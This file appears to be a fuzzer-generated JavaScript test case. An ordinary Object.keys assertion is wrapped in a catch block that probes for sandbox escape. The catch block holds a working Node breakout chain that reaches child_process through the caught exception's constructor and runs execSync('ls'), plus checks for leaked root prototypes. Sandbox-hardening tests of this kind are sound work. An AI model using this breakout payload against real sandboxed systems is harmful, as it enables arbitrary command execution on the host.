try {
    var obj = {
        prop1: 1001,
        prop2: function () {
            throw () => {
                return () => {
                };
            };
            return 1002;
        }
    };
    Object.defineProperty(obj, 'prop3', {
        value: 1003,
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(obj, 'prop4', {
        get: function () {
            return 1004;
        },
        enumerable: false,
        configurable: true
    });
    var arr = Object.keys(obj);
    assert.sameValue(arr.length, 2, 'arr.length');
    assert.sameValue(arr[0], 'prop1', 'arr[0]');
    assert.sameValue(arr[1], 'prop2', 'arr[1]');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}